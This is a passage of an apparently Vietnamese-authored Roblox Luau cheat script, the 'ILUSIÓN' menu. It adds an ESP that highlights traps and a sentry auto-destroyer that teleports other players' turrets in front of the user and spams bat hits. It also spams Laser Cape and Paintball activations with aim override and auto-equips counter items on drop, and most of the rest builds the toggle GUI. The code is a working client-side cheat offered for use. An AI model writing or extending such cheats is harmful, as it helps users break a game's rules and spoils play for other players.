	lbl.Size = UDim2.fromScale(1, 1)
	lbl.BackgroundTransparency = 1
	lbl.Text = "TRAP"
	lbl.TextColor3 = Color3.fromRGB(255, 80, 80)
	lbl.TextStrokeTransparency = 0.3
	lbl.TextStrokeColor3 = Color3.new(0, 0, 0)
	lbl.Font = Enum.Font.GothamBlack
	lbl.TextSize = 14
	lbl.Parent = bb

	TrapESP.data[root] = { hl = hl, bb = bb, part = part }
end

local function trapScanOnce()
	if not TrapESP.on then return end
	-- Clean dead
	for inst, d in pairs(TrapESP.data) do
		if not inst.Parent or (d.part and not d.part.Parent) then
			trapCleanupOne(inst)
		end
	end
	local function scan(container, depth)
		if not container or depth > 6 then return end
		for _, child in ipairs(container:GetChildren()) do
			if isTrapCandidate(child) then
				trapAttach(child)
			end
			-- common folders
			local n = string.lower(child.Name)
			if child:IsA("Folder") or child:IsA("Model") then
				if n:find("trap", 1, true) or n:find("map", 1, true) or n:find("world", 1, true)
					or n:find("obstacle", 1, true) or n:find("hazard", 1, true)
					or depth < 3 then
					scan(child, depth + 1)
				end
			end
		end
	end
	pcall(function() scan(workspace, 0) end)
end

function startTrapESP()
	if TrapESP.on then return end
	TrapESP.on = true
	TrapESP.scanToken += 1
	local token = TrapESP.scanToken
	trapScanOnce()
	table.insert(TrapESP.conns, workspace.DescendantAdded:Connect(function(obj)
		if not TrapESP.on then return end
		if isTrapCandidate(obj) then
			task.defer(trapAttach, obj)
		end
	end))
	table.insert(TrapESP.conns, workspace.DescendantRemoving:Connect(function(obj)
		if TrapESP.data[obj] then trapCleanupOne(obj) end
	end))
	task.spawn(function()
		while TrapESP.on and TrapESP.scanToken == token do
			pcall(trapScanOnce)
			task.wait(1.25)
		end
	end)
end

function stopTrapESP()
	TrapESP.on = false
	TrapESP.scanToken += 1
	for _, c in ipairs(TrapESP.conns) do
		pcall(function() c:Disconnect() end)
	end
	TrapESP.conns = {}
	trapCleanupAll()
end

function setTrapESP(on)
	St.trapEsp = on and true or false
	if St.trapEsp then startTrapESP() else stopTrapESP() end
	saveCfg()
end


-- Anti Lag (Vis simplified)
local antiLagConn = nil
function applyDerender(obj)
	pcall(function()
 if obj:IsA("Accessory") or obj:IsA("Hat") then
 obj:Destroy()
 elseif obj:IsA("BasePart") then
 obj.Material = Enum.Material.Plastic
 obj.Reflectance = 0
 obj.CastShadow = false
 elseif obj:IsA("Decal") or obj:IsA("Texture") then
 obj.Transparency = 1
 elseif obj:IsA("ParticleEmitter") or obj:IsA("Trail") or obj:IsA("Beam")
 or obj:IsA("Fire") or obj:IsA("Smoke") or obj:IsA("Sparkles") then
 obj.Enabled = false
 end
	end)
end
function setAntiLag(on)
	St.antiLag = on
	if on then
 Lighting.GlobalShadows = false
 Lighting.FogEnd = 1e10
 Lighting.Brightness = 0
 for _, e in pairs(Lighting:GetChildren()) do
 if e:IsA("BlurEffect") or e:IsA("BloomEffect") or e:IsA("SunRaysEffect")
 or e:IsA("ColorCorrectionEffect") or e:IsA("DepthOfFieldEffect") then
 pcall(function() e.Enabled = false end)
 end
 end
 for _, obj in ipairs(workspace:GetDescendants()) do applyDerender(obj) end
 if antiLagConn then antiLagConn:Disconnect() end
 antiLagConn = workspace.DescendantAdded:Connect(applyDerender)
	else
 if antiLagConn then antiLagConn:Disconnect() antiLagConn = nil end
 Lighting.GlobalShadows = true
 Lighting.FogEnd = 100000
 Lighting.Brightness = 2
	end
	saveCfg()
end


----------------------------------------------------------------
-- INFINITE JUMP (Vis BloodHounds hold)
----------------------------------------------------------------
local InfJump = { enabled = false, conn = nil, last = 0 }
-- (InfJump moved above with BloodHounds speed)

-- AUTO DESTROY SENTRY (full from AutoDestroyTurret)
----------------------------------------------------------------
local GTurret = { AutoDestroyTurret = false }
local turretBusy = setmetatable({}, { __mode = "k" })
local turretQueued = setmetatable({}, { __mode = "k" })
local turretCD = setmetatable({}, { __mode = "k" })
local activeTurretAtk = 0
function isEnemyTurret(obj)
	if not obj or not obj:IsA("BasePart") then return false end
	local name, nameLower = obj.Name, obj.Name:lower()
	local ownerId = name:match("^Sentry_(%d+)$") or name:match("^sentry_(%d+)$")
	if not ownerId then
 ownerId = name:match("^CandySentry_(%d+)$") or name:match("^Candy_Sentry_(%d+)$")
 or name:match("^candy_sentry_(%d+)$") or nameLower:match("^candy[_%-]?sentry_(%d+)$")
	end
	if not ownerId and nameLower:find("candy") and nameLower:find("sentry") then
 ownerId = name:match("(%d+)$")
	end
	if not ownerId then ownerId = name:match("^[Tt]urret_(%d+)$") end
	if not ownerId and nameLower:find("sentry") then ownerId = name:match("(%d+)$") end
	return ownerId ~= nil and tostring(ownerId) ~= tostring(LP.UserId)
end
function setTurretNoClip(turret)
	if not isEnemyTurret(turret) then return end
	pcall(function()
 turret.CanCollide = false
 turret.Anchored = true
 turret.AssemblyLinearVelocity = Vector3.zero
 turret.AssemblyAngularVelocity = Vector3.zero
	end)
end
function getTurretTimeLabel(turret)
	if not turret or not turret.Parent then return nil end
	local sf = turret:FindFirstChild("SetupFrame")
	local mf = sf and sf:FindFirstChild("MainFrame")
	local tl = mf and mf:FindFirstChild("Time")
	if tl and tl:IsA("TextLabel") then return tl end
	for _, d in ipairs(turret:GetDescendants()) do
 if d:IsA("TextLabel") then
 local n = d.Name:lower()
 if n == "time" or n == "timer" or n == "countdown" then return d end
 end
	end
	return nil
end
function shouldAttackTurret(turret)
	if LP:GetAttribute("Stealing") ~= nil then return false end
	if not isEnemyTurret(turret) then return false end
	setTurretNoClip(turret)
	local timeLabel = getTurretTimeLabel(turret)
	if timeLabel then
 local ok, text = pcall(function() return timeLabel.Text end)
 if not ok then return false end
 text = tostring(text or ""):gsub("^%s+", ""):gsub("%s+$", "")
 if text == "" then return false end
 if string.find(text, "^%d+%s*[sS]!?$") or string.find(text, "^%d+$") then return true end
 return false
	end
	return true
end
function bringTurretInFront(turret, hrp)
	if not turret or not hrp then return end
	local forward = hrp.CFrame.LookVector
	local targetPos = hrp.Position + forward * 2.8 + Vector3.new(0, 1.15, 0)
	pcall(function()
 turret.AssemblyLinearVelocity = Vector3.zero
 turret.CFrame = CFrame.lookAt(targetPos, targetPos + forward)
	end)
end
function findBat()
	local char = LP.Character
	if not char then return nil end
	local bat = char:FindFirstChild("Bat") or LP.Backpack:FindFirstChild("Bat")
	if bat then return bat end
	for _, t in ipairs(char:GetChildren()) do
 if t:IsA("Tool") and t.Name:lower():find("bat") then return t end
	end
	for _, t in ipairs(LP.Backpack:GetChildren()) do
 if t:IsA("Tool") and t.Name:lower():find("bat") then return t end
	end
	return nil
end
function ensureBat(hum, char)
	local held = char:FindFirstChildOfClass("Tool")
	if held and (held.Name == "Bat" or held.Name:lower():find("bat")) then return held end
	local bat = findBat()
	if not bat then return nil end
	pcall(function() hum:EquipTool(bat) end)
	return char:FindFirstChild("Bat") or bat
end
function attackTurret(turret)
	local now = os.clock()
	if turretBusy[turret] or turretQueued[turret] then return end
	if activeTurretAtk >= 2 then return end
	if not shouldAttackTurret(turret) then return end
	if (turretCD[turret] or 0) > now then return end
	turretQueued[turret] = true
	turretCD[turret] = now + 0.15
	task.spawn(function()
 turretQueued[turret] = nil
 if activeTurretAtk >= 2 or turretBusy[turret] or not shouldAttackTurret(turret) then return end
 activeTurretAtk = activeTurretAtk + 1
 turretBusy[turret] = true
 pcall(function()
 local attempts, batReady = 0, false
 while attempts < 18 and GTurret.AutoDestroyTurret do
 if not turret or not turret.Parent or not shouldAttackTurret(turret) then break end
 local char = LP.Character
 local hrp = char and char:FindFirstChild("HumanoidRootPart")
 local hum = char and char:FindFirstChildOfClass("Humanoid")
 if not hrp or not hum or hum.Health <= 0 then break end
 local okD, dist = pcall(function() return (turret.Position - hrp.Position).Magnitude end)
 if okD and dist > 250 then break end
 setTurretNoClip(turret)
 bringTurretInFront(turret, hrp)
 local bat
 if not batReady then
 bat = ensureBat(hum, char)
 batReady = bat ~= nil
 else
 bat = char:FindFirstChild("Bat") or findBat()
 local held = char:FindFirstChildOfClass("Tool")
 if held and held.Name ~= "Bat" and not held.Name:lower():find("bat") then break end
 end
 if bat then pcall(function() bat:Activate() end) end
 attempts = attempts + 1
 task.wait(0.045)
 end
 end)
 turretBusy[turret] = nil
 activeTurretAtk = math.max(0, activeTurretAtk - 1)
	end)
end
workspace.DescendantAdded:Connect(function(obj)
	if isEnemyTurret(obj) then setTurretNoClip(obj) end
	if GTurret.AutoDestroyTurret and shouldAttackTurret(obj) then task.defer(attackTurret, obj) end
end)
task.spawn(function()
	while task.wait(0.25) do
 if GTurret.AutoDestroyTurret then
 local pending = {}
 for _, obj in ipairs(workspace:GetDescendants()) do
 if isEnemyTurret(obj) then
 setTurretNoClip(obj)
 if shouldAttackTurret(obj) and not turretBusy[obj] then
 table.insert(pending, obj)
 end
 end
 end
 local char = LP.Character
 local hrp = char and char:FindFirstChild("HumanoidRootPart")
 if hrp and #pending > 0 then
 table.sort(pending, function(a, b)
 return (a.Position - hrp.Position).Magnitude < (b.Position - hrp.Position).Magnitude
 end)
 for i = 1, math.min(2, #pending) do attackTurret(pending[i]) end
 end
 end
	end
end)
function setDestroySentry(on)
	St.destroySentry = on and true or false
	GTurret.AutoDestroyTurret = St.destroySentry
	if _G.IlusionRefreshSentryBtn then _G.IlusionRefreshSentryBtn() end
	saveCfg()
end

----------------------------------------------------------------
-- SPAM LASER CAPE / PAINTBALL (activate only, no auto-equip)
----------------------------------------------------------------
local spamConn = nil
function startSpamLoop()
	if spamConn then return end
	spamConn = RS.Heartbeat:Connect(function()
 local char = LP.Character
 if not char then return end
 local tool = char:FindFirstChildOfClass("Tool")
 if not tool then return end
 local n = tool.Name
 if St.spamLaser and n == "Laser Cape" then
 if aimOn then overrideMouse() end
 pcall(function() tool:Activate() end)
 elseif St.spamPaint and n == "Paintball Gun" then
 if aimOn then overrideMouse() end
 pcall(function() tool:Activate() end)
 end
	end)
end
function stopSpamLoopIfIdle()
	if not St.spamLaser and not St.spamPaint then
 if spamConn then pcall(function() spamConn:Disconnect() end) spamConn = nil end
	end
end
function setSpamLaser(on)
	St.spamLaser = on and true or false
	if St.spamLaser then startSpamLoop() else stopSpamLoopIfIdle() end
	saveCfg()
end
function setSpamPaint(on)
	St.spamPaint = on and true or false
	if St.spamPaint then startSpamLoop() else stopSpamLoopIfIdle() end
	saveCfg()
end

----------------------------------------------------------------
-- COUNTER: Laser Cape / Boogie Bomb / Swap Body / Equip on Drop
----------------------------------------------------------------
local counterConn = nil
local COUNTER_TOOL_NAMES = {
	laser = { "Laser Cape", "LaserCape", "laser cape" },
	boogie = { "Boogie Bomb", "BoogieBomb", "boogie bomb", "Disco Ball" },
	swap = { "Body Swap Potion", "Swap Body", "Body Swap", "SwapBody", "Potion of Body Swap" },
}

local function findToolByNames(names)
	local char = LP.Character
	local bp = LP:FindFirstChild("Backpack")
	for _, nm in ipairs(names) do
 if char then
 local t = char:FindFirstChild(nm)
 if t and t:IsA("Tool") then return t end
 end
 if bp then
 local t = bp:FindFirstChild(nm)
 if t and t:IsA("Tool") then return t end
 end
	end
	-- fuzzy
	local function scan(parent)
 if not parent then return nil end
 for _, ch in ipairs(parent:GetChildren()) do
 if ch:IsA("Tool") then
 local ln = string.lower(ch.Name)
 for _, nm in ipairs(names) do
 if ln:find(string.lower(nm), 1, true) then return ch end
 end
 end
 end
 return nil
	end
	return scan(char) or scan(bp)
end

local function equipAndActivate(tool)
	if not tool then return end
	local char = LP.Character
	local hum = char and char:FindFirstChildOfClass("Humanoid")
	if not hum then return end
	pcall(function()
 if tool.Parent ~= char then
 hum:EquipTool(tool)
 end
	end)
	task.defer(function()
 pcall(function() tool:Activate() end)
	end)
end

function startCounterLoop()
	-- No spam Activate khi chọn counter — chỉ dùng lúc Drop
	if counterConn then
 pcall(function() counterConn:Disconnect() end)
 counterConn = nil
	end
end

function stopCounterLoopIfIdle()
	if not (St.counterLaser or St.counterBoogie or St.counterSwapBody or St.equipOnDrop) then
 if counterConn then pcall(function() counterConn:Disconnect() end) counterConn = nil end
	end
end

local function _counterExclusive(which)
	-- Chỉ 1 counter ON: OFF các cái còn lại
	St.counterLaser = (which == "laser")
	St.counterBoogie = (which == "boogie")
	St.counterSwapBody = (which == "swap")
	if ToggleRefs then
 for k, flag in pairs({counterLaser = (which=="laser"), counterBoogie = (which=="boogie"), counterSwapBody = (which=="swap")}) do
 local r = ToggleRefs[k]
 if r and r.setVisual then pcall(r.setVisual, flag) end
 end
	end
end

function setCounterLaser(on)
	if on then
 _counterExclusive("laser")
 -- chỉ lưu lựa chọn; equip+activate x2 khi Drop
 stopCounterLoopIfIdle()
	else
 St.counterLaser = false
 stopCounterLoopIfIdle()
	end
	saveCfg()
end
function setCounterBoogie(on)
	if on then
 _counterExclusive("boogie")
 -- chỉ lưu lựa chọn; equip+activate x2 khi Drop
 stopCounterLoopIfIdle()
	else
 St.counterBoogie = false
 stopCounterLoopIfIdle()
	end
	saveCfg()
end
function setCounterSwapBody(on)
	if on then
 _counterExclusive("swap")
 -- chỉ lưu lựa chọn; equip+activate x2 khi Drop
 stopCounterLoopIfIdle()
	else
 St.counterSwapBody = false
 stopCounterLoopIfIdle()
	end
	saveCfg()
end
function setEquipOnDrop(on)
	St.equipOnDrop = on and true or false
	saveCfg()
end

-- Equip + activate khi Drop xong
_G.IlusionCounterOnDrop = function()
	-- Counter đã chọn: equip 1 + activate 2 khi Drop (Fling & Jump)
	local anyCounter = St.counterLaser or St.counterBoogie or St.counterSwapBody
	if not anyCounter and not St.equipOnDrop then return end
	if _G._VisCounterDropBusy == true then return end
	_G._VisCounterDropBusy = true
	task.spawn(function()
 local char = LP.Character
 local hum = char and char:FindFirstChildOfClass("Humanoid")
 local prevTool = char and char:FindFirstChildOfClass("Tool")
 local prevName = prevTool and prevTool.Name or nil
 task.wait(0.2)
 local function runOnce(names)
 local tool = findToolByNames(names)
 if not tool then return end
 equipAndActivate(tool) -- equip + activate #1
 task.wait(0.15)
 pcall(function() tool:Activate() end) -- activate #2
 task.wait(0.1)
 end
 if St.counterLaser then runOnce(COUNTER_TOOL_NAMES.laser) end
 if St.counterBoogie then runOnce(COUNTER_TOOL_NAMES.boogie) end
 if St.counterSwapBody then runOnce(COUNTER_TOOL_NAMES.swap) end
 task.wait(0.1)
 pcall(function()
 local c = LP.Character
 local h = c and c:FindFirstChildOfClass("Humanoid")
 if not h or not prevName then return end
 local pl = string.lower(prevName)
 local isCounter = false
 for _, names in pairs(COUNTER_TOOL_NAMES) do
 for _, nm in ipairs(names) do
 if pl:find(string.lower(nm), 1, true) then isCounter = true break end
 end
 if isCounter then break end
 end
 if not isCounter then
 local bp = LP:FindFirstChild("Backpack")
 local t = (c and c:FindFirstChild(prevName)) or (bp and bp:FindFirstChild(prevName))
 if t and t:IsA("Tool") then h:EquipTool(t) end
 end
 end)
 _G._VisCounterDropBusy = false
	end)
end

-- Bật toggle Counter: equip 1 + activate 2 (một lần)
_G.IlusionCounterOneShot = function(kind)
	if _G._VisCounterDropBusy then return end
	_G._VisCounterDropBusy = true
	task.spawn(function()
 local names = COUNTER_TOOL_NAMES[kind]
 if not names then _G._VisCounterDropBusy = false return end
 local tool = findToolByNames(names)
 if tool then
 equipAndActivate(tool)
 task.wait(0.15)
 pcall(function() tool:Activate() end)
 end
 _G._VisCounterDropBusy = false
	end)
end



function corner(p, r)
	local c = Instance.new("UICorner")
	c.CornerRadius = UDim.new(0, r or 10)
	c.Parent = p
	return c
end
function stroke(p, col)
	local s = Instance.new("UIStroke")
	s.Color = col or C.stroke
	s.Thickness = 1
	s.Transparency = 0.35
	s.Parent = p
	return s
end

local Gui = Instance.new("ScreenGui")
Gui.Name = "IlusionFullMenu"
Gui.ResetOnSpawn = false
Gui.IgnoreGuiInset = true
Gui.DisplayOrder = 200
Gui.Parent = PlayerGui

local MW, MH = 260, 360
local Main = Instance.new("Frame")
Main.Name = "Main"
Main.Size = UDim2.new(0, MW, 0, MH)
Main.Position = UDim2.new(0.5, -MW / 2, 0.5, -MH / 2)
Main.BackgroundColor3 = C.bg
Main.BorderSizePixel = 0
Main.ClipsDescendants = true
Main.Active = true
Main.Parent = Gui
-- Menu wallpaper
do
	local bg = Instance.new("ImageLabel")
	bg.Name = "MenuBackground"
	bg.Size = UDim2.fromScale(1, 1)
	bg.BackgroundTransparency = 1
	bg.ImageTransparency = 0.35
	bg.ScaleType = Enum.ScaleType.Crop
	bg.ZIndex = 0
	bg.Parent = Main
	MenuBgImage = bg
	pcall(resolveBgAssets)
	pcall(function() applyMenuBackground(St.bgIndex or 1) end)
end


-- Menu scale (to/nhỏ menu chính)
local menuScaleObj = Instance.new("UIScale")
menuScaleObj.Name = "IlusionMenuScale"
menuScaleObj.Scale = tonumber(St.menuScale) or 1
menuScaleObj.Parent = Main
function applyMenuScale()
	local sc = math.clamp(tonumber(St.menuScale) or 1, 0.5, 1.5)
	St.menuScale = sc
	if menuScaleObj and menuScaleObj.Parent then
 menuScaleObj.Scale = sc
	else
 -- fallback: resize Main
 local baseW, baseH = 270, 360
 Main.Size = UDim2.new(0, math.floor(baseW * sc), 0, math.floor(baseH * sc))
	end
end
pcall(applyMenuScale)
-- restore menu position
pcall(function()
	local p = St._mainPos
	if type(p) == "table" and p[1] ~= nil then
 Main.Position = UDim2.new(p[1], p[2], p[3], p[4])
	end
end)

corner(Main, 14)
local mainStroke = stroke(Main)
mainStroke.Thickness = 2.2
mainStroke.Transparency = 0
-- Empire-style animated outline gradient
do
	local g = Instance.new("UIGradient")
	g.Name = "EmpireOutlineGrad"
	g.Color = ColorSequence.new({
 ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 255, 255)),
 ColorSequenceKeypoint.new(0.15, Color3.fromRGB(190, 190, 190)),
 ColorSequenceKeypoint.new(0.35, Color3.fromRGB(255, 255, 255)),
 ColorSequenceKeypoint.new(0.55, Color3.fromRGB(125, 125, 125)),
 ColorSequenceKeypoint.new(0.75, Color3.fromRGB(245, 245, 245)),
 ColorSequenceKeypoint.new(0.90, Color3.fromRGB(175, 175, 175)),
 ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 255, 255)),
	})
	g.Parent = mainStroke
	task.spawn(function()
 local t0 = tick()
 while mainStroke and mainStroke.Parent do
 local t = (tick() - t0) * 0.35
 g.Rotation = (t * 60) % 360
 task.wait(0.03)
 end
	end)
end

local Top = Instance.new("Frame")
Top.Size = UDim2.new(1, 0, 0, 36)
Top.BackgroundColor3 = C.bg2
Top.BorderSizePixel = 0
Top.ZIndex = 15
Top.Active = true
Top.Parent = Main
corner(Top, 14)
local topFix = Instance.new("Frame")
topFix.Size = UDim2.new(1, 0, 0, 12)
topFix.Position = UDim2.new(0, 0, 1, -12)
topFix.BackgroundColor3 = C.bg2
topFix.BorderSizePixel = 0
topFix.Parent = Top

local Title = Instance.new("TextLabel")
Title.Size = UDim2.new(1, -80, 1, 0)
Title.Position = UDim2.new(0, 14, 0, 0)
Title.BackgroundTransparency = 1
Title.Text = "ILUSIÓN"
Title.TextColor3 = Color3.fromRGB(255, 255, 255)
Title.TextSize = 12
Title.Font = Enum.Font.GothamBlack
Title.TextXAlignment = Enum.TextXAlignment.Left
Title.TextStrokeTransparency = 0.55
Title.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
Title.Parent = Top
-- gradient chữ menu
local titleGrad = Instance.new("UIGradient")
titleGrad.Color = ColorSequence.new({
	ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 255, 255)),
	ColorSequenceKeypoint.new(0.35, Color3.fromRGB(205, 205, 205)),
	ColorSequenceKeypoint.new(0.65, Color3.fromRGB(255, 255, 255)),
	ColorSequenceKeypoint.new(1, Color3.fromRGB(170, 170, 170)),
})
titleGrad.Parent = Title
task.spawn(function()
	local t0 = tick()
	while Title and Title.Parent do
 titleGrad.Offset = Vector2.new((math.sin(tick() - t0) * 0.35), 0)
 task.wait(0.03)
	end
end)

-- Close nút nhỏ góc phải (phụ)
local CloseBtn = Instance.new("TextButton")
CloseBtn.Size = UDim2.new(0, 22, 0, 22)
CloseBtn.Position = UDim2.new(1, -28, 0.5, -11)
CloseBtn.BackgroundColor3 = Color3.fromRGB(28, 28, 28)
CloseBtn.Text = "X"
CloseBtn.TextColor3 = C.textDim
CloseBtn.TextSize = 11
CloseBtn.Font = Enum.Font.GothamBold
CloseBtn.AutoButtonColor = false
CloseBtn.Parent = Top
corner(CloseBtn, 6)

-- Helper tròn bên TRÁI menu (LKZ style) — ấn = đóng
local Helper = Instance.new("TextButton")
Helper.Name = "HelperClose"
Helper.Size = UDim2.new(0, 44, 0, 44)
Helper.Position = UDim2.new(0, -52, 0, 8)
Helper.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
Helper.Text = "⚔"
Helper.TextColor3 = C.accent
Helper.TextSize = 18
Helper.Font = Enum.Font.GothamBold
Helper.AutoButtonColor = false
Helper.Parent = Main
corner(Helper, 22)
local hs = Instance.new("UIStroke", Helper)
hs.Color = C.accent
hs.Thickness = 2
hs.Transparency = 0.15

-- Tabs dọc (Clean style) — PC kéo xuống được
local TAB_W = 54
local TabBar = Instance.new("ScrollingFrame")
TabBar.Name = "TabBar"
TabBar.Size = UDim2.new(0, TAB_W, 1, -48)
TabBar.Position = UDim2.new(1, -TAB_W - 4, 0, 44)
TabBar.BackgroundColor3 = Color3.fromRGB(14, 14, 20)
TabBar.BackgroundTransparency = 0.25
TabBar.BorderSizePixel = 0
TabBar.ScrollBarThickness = 4
TabBar.ScrollBarImageColor3 = C.accent
TabBar.ScrollingDirection = Enum.ScrollingDirection.Y
TabBar.CanvasSize = UDim2.new(0, 0, 0, 0)
TabBar.AutomaticCanvasSize = Enum.AutomaticSize.Y
TabBar.ZIndex = 20
TabBar.Active = true
TabBar.Selectable = true
TabBar.Parent = Main
corner(TabBar, 8)
local tabList = Instance.new("UIListLayout", TabBar)
tabList.FillDirection = Enum.FillDirection.Vertical
tabList.Padding = UDim.new(0, 4)
tabList.HorizontalAlignment = Enum.HorizontalAlignment.Center
tabList.SortOrder = Enum.SortOrder.LayoutOrder
local tabPad = Instance.new("UIPadding", TabBar)
tabPad.PaddingTop = UDim.new(0, 4)
tabPad.PaddingBottom = UDim.new(0, 6)
tabPad.PaddingLeft = UDim.new(0, 3)
tabPad.PaddingRight = UDim.new(0, 3)

local pages, tabBtns = {}, {}
function makePage(name)
	local sc = Instance.new("ScrollingFrame")
	sc.Name = name
	-- Nội dung bên phải tab dọc
	sc.Size = UDim2.new(1, -(TAB_W + 10), 1, -52)
	sc.Position = UDim2.new(0, 4, 0, 48)
	sc.BackgroundTransparency = 1
	sc.BorderSizePixel = 0
	sc.ScrollBarThickness = 4
	sc.ScrollBarImageColor3 = C.accent
	sc.ScrollingDirection = Enum.ScrollingDirection.Y
	sc.AutomaticCanvasSize = Enum.AutomaticSize.Y
	sc.CanvasSize = UDim2.new(0, 0, 0, 0)
	sc.Visible = false
	sc.ZIndex = 10
	sc.Active = true
	sc.Selectable = true
	sc.Parent = Main
	local pad = Instance.new("UIPadding", sc)
	pad.PaddingTop = UDim.new(0, 4)
	pad.PaddingBottom = UDim.new(0, 10)
	pad.PaddingLeft = UDim.new(0, 6)
	pad.PaddingRight = UDim.new(0, 8)
	local lay = Instance.new("UIListLayout", sc)
	lay.Padding = UDim.new(0, 5)
	lay.SortOrder = Enum.SortOrder.LayoutOrder
	sc.Active = true
	sc.Selectable = true
	pages[name] = sc
	return sc
end
local pagePlayer = makePage("Player")
local pageSpeed = makePage("Speed")
local pageESP = makePage("ESP")
local pageSpam = makePage("Spam")
local pageCounter = makePage("Counter")
local pageSet = makePage("Settings")
local pageKeys = makePage("Keybinds")

function setTab(name)
	for n, p in pairs(pages) do
 p.Visible = (n == name)
 p.ZIndex = 3
	end
	for n, b in pairs(tabBtns) do
 local on = n == name
 b.BackgroundColor3 = on and C.accent or C.card
 b.TextColor3 = on and Color3.fromRGB(30, 5, 5) or C.text
	end
end
function addTab(name, order)
	local b = Instance.new("TextButton")
	b.Size = UDim2.new(1, -4, 0, 28)
	b.BackgroundColor3 = C.card
	b.Text = name
	b.TextColor3 = C.text
	b.TextSize = 11
	b.Font = Enum.Font.GothamBold
	b.AutoButtonColor = false
	b.LayoutOrder = order
	b.Active = true
	b.Selectable = true
	b.ZIndex = 21
	b.Parent = TabBar
	corner(b, 8)
	local function go() setTab(name) end
	b.MouseButton1Click:Connect(go)
	b.Activated:Connect(go)
	tabBtns[name] = b
end
addTab("Player", 1)
addTab("Speed", 2)
addTab("ESP", 3)
addTab("Spam", 4)
addTab("Counter", 5)
addTab("Settings", 6)
addTab("Keybinds", 7)

function section(parent, text, order)
	local f = Instance.new("Frame")
	f.Size = UDim2.new(1, 0, 0, 16)
	f.BackgroundTransparency = 1
	f.LayoutOrder = order
	f.Parent = parent
	local t = Instance.new("TextLabel")
	t.Size = UDim2.new(1, 0, 1, 0)
	t.BackgroundTransparency = 1
	t.Text = text
	t.TextColor3 = C.textDim
	t.TextSize = 11
	t.Font = Enum.Font.GothamBold
	t.TextXAlignment = Enum.TextXAlignment.Left
	t.Parent = f
end
function row(parent, h, order)
	local f = Instance.new("Frame")
	f.Size = UDim2.new(1, 0, 0, h or 38)
	f.BackgroundColor3 = C.card
	f.BorderSizePixel = 0
	f.LayoutOrder = order
	f.Active = true
	f.Parent = parent
	corner(f, 9)
	stroke(f)
	return f
end
function toggle(parent, label, default, cb, order)
	local r = row(parent, 38, order)
	local txt = Instance.new("TextLabel")
	txt.Size = UDim2.new(1, -60, 1, 0)
	txt.Position = UDim2.new(0, 12, 0, 0)
	txt.BackgroundTransparency = 1
	txt.Text = label
	txt.TextColor3 = C.text
	txt.TextSize = 13
	txt.Font = Enum.Font.Gotham
	txt.TextXAlignment = Enum.TextXAlignment.Left
	txt.Parent = r
	local track = Instance.new("Frame")
	track.Size = UDim2.new(0, 40, 0, 22)
	track.Position = UDim2.new(1, -50, 0.5, -11)
	track.BackgroundColor3 = default and C.on or C.off
	track.BorderSizePixel = 0
	track.Parent = r
	corner(track, 11)
	local knob = Instance.new("Frame")
	knob.Size = UDim2.new(0, 18, 0, 18)
	knob.Position = default and UDim2.new(1, -20, 0.5, -9) or UDim2.new(0, 2, 0.5, -9)
	knob.BackgroundColor3 = Color3.new(1, 1, 1)
	knob.BorderSizePixel = 0
	knob.Parent = track
	corner(knob, 9)
	local state = default
	local btn = Instance.new("TextButton")
	btn.Size = UDim2.new(1, 0, 1, 0)
	btn.BackgroundTransparency = 1
	btn.Text = ""
	btn.Parent = r
	local function apply(on)
 state = on and true or false
 TS:Create(track, TweenInfo.new(0.15), { BackgroundColor3 = state and C.on or C.off }):Play()
 TS:Create(knob, TweenInfo.new(0.15), {
 Position = state and UDim2.new(1, -20, 0.5, -9) or UDim2.new(0, 2, 0.5, -9),
 }):Play()
 if cb then pcall(cb, state) end
 pcall(saveCfg)
	end
	btn.Active = true
	btn.Selectable = true
	btn.ZIndex = 50
	track.ZIndex = 6
	knob.ZIndex = 7
	r.Active = true
	local _busy = false
	local function fireToggle()
 if _busy then return end
 _busy = true
 apply(not state)
 task.delay(0.15, function() _busy = false end)
	end
	btn.MouseButton1Click:Connect(fireToggle)
	btn.Activated:Connect(fireToggle)
	-- mobile fallback: InputEnded short tap
	do
 local down, startP
 btn.InputBegan:Connect(function(input)
 if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
 down = true
 startP = input.Position
 end
 end)
 btn.InputEnded:Connect(function(input)
 if not down then return end
 if input.UserInputType ~= Enum.UserInputType.MouseButton1 and input.UserInputType ~= Enum.UserInputType.Touch then return end
 down = false
 if startP and (input.Position - startP).Magnitude < 12 then
 fireToggle()
 end
 end)
	end
	local function setVisualOnly(on)
 state = on and true or false
 TS:Create(track, TweenInfo.new(0.12), { BackgroundColor3 = state and C.on or C.off }):Play()
 TS:Create(knob, TweenInfo.new(0.12), {
 Position = state and UDim2.new(1, -20, 0.5, -9) or UDim2.new(0, 2, 0.5, -9),
 }):Play()
	end
	return {
 set = apply,
 setVisual = setVisualOnly,
 get = function() return state end,
	}
end
function toggleNamed(parent, label, default, cb, order, refName)
	local api = toggle(parent, label, default, cb, order)
	if refName then ToggleRefs[refName] = api end
	return api
end
function numBox(parent, pos, w, val, cb)
	local b = Instance.new("TextBox")
	b.Size = UDim2.new(0, w, 0, 24)
	b.Position = pos
	b.BackgroundColor3 = C.box
	b.Text = tostring(val)
	b.TextColor3 = C.text
	b.TextSize = 13
	b.Font = Enum.Font.GothamBold
	b.ClearTextOnFocus = false
	b.Active = true
	b.ZIndex = 25
	b.Parent = parent
	corner(b, 6)
	b.FocusLost:Connect(function()
 local n = tonumber(b.Text)
 if n then
 n = math.clamp(n, 1, 200)
 b.Text = tostring(n)
 if cb then cb(n) end
 else
 b.Text = tostring(val)
 end
	end)
	return b
end
function keyName(k)
	return k and tostring(k):gsub("Enum.KeyCode.", "") or "?"
end
local listening = nil
function keyBtn(parent, key, onSet, pos)
	local b = Instance.new("TextButton")
	b.Size = UDim2.new(0, 36, 0, 24)
	b.Position = pos or UDim2.new(0, 0, 0, 0)
	b.BackgroundColor3 = C.box
	b.Text = keyName(key)
	b.TextColor3 = C.text
	b.TextSize = 11
	b.Font = Enum.Font.GothamBold
	b.AutoButtonColor = false
	b.Active = true
	b.ZIndex = 25
	b.Parent = parent
	corner(b, 6)
	b.MouseButton1Click:Connect(function()
 if listening then return end
 listening = b
 b.Text = "..."
 local conn
 conn = UIS.InputBegan:Connect(function(input, gp)
 if gp or input.UserInputType ~= Enum.UserInputType.Keyboard then return end
 if input.KeyCode == Enum.KeyCode.Escape then
 b.Text = keyName(key)
 listening = nil
 conn:Disconnect()
 return
 end
 key = input.KeyCode
